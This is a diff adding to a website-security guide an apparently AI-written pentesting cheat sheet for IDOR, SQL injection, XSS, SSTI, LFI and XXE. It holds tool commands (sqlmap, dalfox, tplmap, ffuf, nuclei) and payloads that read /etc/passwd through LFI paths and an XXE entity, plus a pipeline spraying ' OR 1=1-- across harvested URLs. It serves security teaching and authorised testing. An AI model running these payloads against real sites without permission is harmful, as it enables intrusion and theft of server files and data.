@@ -93,4 +93,175 @@ If you’re looking for free or inexpensive options, try these:
 - **Combine Tools**: No single tool catches everything. Use a mix of scanners (e.g., Qualys for SSL, OWASP ZAP for app vulnerabilities) for comprehensive coverage.[](https://www.coresecurity.com/blog/top-14-vulnerability-scanners-cybersecurity-professionals)
 - **Secure Development**: If you’re building or maintaining the site, integrate vulnerability scanning into your CI/CD pipeline using tools like Acunetix or Snyk.[](https://www.acunetix.com/vulnerability-scanner/)[](https://snyk.io/website-scanner/)
 
+To check for vulnerabilities like **IDOR, SQLi, XSS, SSTI, XXE, LFI**, etc. on a website, you can use a **combination of tools, techniques, and manual testing**. Below is a clear and structured guide for each vulnerability type with **tools and methods**:
+
+---
+
+## 🔧 TOOLS YOU SHOULD INSTALL FIRST (in Kali Linux or any Pentesting OS)
+
+* `nuclei`
+* `ffuf`, `dirsearch`, or `gobuster`
+* `burpsuite` (essential for manual testing)
+* `sqlmap`
+* `XSStrike`
+* `gf` (for filtering URLs)
+* `httpx` (for probing)
+* `dalfox` (for XSS)
+* `kxss` (for reflection)
+* `gf` + `waybackurls` or `gau`
+* `paramspider`
+* `qsreplace`
+* `tplmap` (for SSTI)
+* `XXEinjector` (for XXE)
+
+---
+
+## 1. 🔄 **IDOR (Insecure Direct Object Reference)**
+
+### 🔍 Manual Method:
+
+* Look for parameters like `user_id`, `account=`, `file=`, etc.
+* Change the values and see if you can access unauthorized data.
+
+### 📦 Tools:
+
+* **Burp Suite** – Repeater or Intruder to test IDOR manually.
+* **Autorize** (Burp Extension) – Automatic detection.
+* **Nuclei** – Some IDOR templates available.
+
+```bash
+nuclei -u https://example.com -t exposures/idor/
+```
+
+---
+
+## 2. 💉 **SQL Injection (SQLi)**
+
+### 🔍 Manual:
+
+* Try payloads like `'`, `' or 1=1 --`, etc. in parameters.
+* Use Burp or browser.
+
+### 📦 Tool:
+
+```bash
+sqlmap -u "https://example.com/page.php?id=1" --batch --dbs
+```
+
+---
+
+## 3. 🔥 **XSS (Cross-Site Scripting)**
+
+### 🔍 Manual:
+
+* Inject `<script>alert(1)</script>` in parameters, forms, URLs.
+
+### 📦 Tools:
+
+```bash
+dalfox url "https://example.com/page?query=1"
+```
+
+```bash
+xsstrike -u "https://example.com/page?search=term"
+```
+
+---
+
+## 4. 🧪 **SSTI (Server-Side Template Injection)**
+
+### 🔍 Manual:
+
+* Payloads:
+
+  * `{{7*7}}`
+  * `${7*7}`
+  * `{{config}}`, etc.
+
+### 📦 Tool:
+
+```bash
+tplmap -u "https://example.com/page?name=guest"
+```
+
+---
+
+## 5. 📂 **LFI (Local File Inclusion)**
+
+### 🔍 Manual:
+
+* Try:
+
+  * `?file=../../../../etc/passwd`
+  * `?file=/etc/hosts`
+  * `?page=php://filter/convert.base64-encode/resource=index.php`
+
+### 📦 Tools:
+
+```bash
+ffuf -u "https://example.com/page=FUZZ" -w lfi-payloads.txt
+```
+
+Use payloads from: `/usr/share/wordlists/lfi/lfi.txt`
+
+---
+
+## 6. 🧾 **XXE (XML External Entity Injection)**
+
+### 🔍 Manual:
+
+* Inject malicious XML in upload forms or POST requests.
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+```
+
+### 📦 Tools:
+
+* **XXEinjector**: [https://github.com/enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector)
+* **Burp + Repeater**
+
+---
+
+## 🔄 Optional But Powerful Methodology
+
+1. **Enumerate URLs & Params**
+
+   ```bash
+   waybackurls example.com > urls.txt
+   gf xss urls.txt >> xss.txt
+   gf sqli urls.txt >> sqli.txt
+   ```
+
+2. **Filter Params**
+
+   ```bash
+   paramspider -d example.com
+   ```
+
+3. **Inject Payloads**
+
+   ```bash
+   cat urls.txt | qsreplace "' OR 1=1--" | httpx -silent
+   ```
+
+---
+
+## 🧠 Pro Tips:
+
+* Use **Burp Suite** to intercept, manipulate, and replay requests.
+* Always **test in a legal environment** (your own server or with permission).
+* Use **Nuclei** for quick scanning:
+
+  ```bash
+  nuclei -u https://example.com -t cves/ -t vulnerabilities/ -t exposures/
+  ```
+
+---
+
+Would you like a ready-made bash script that automates scanning for all of these?
+
+
 
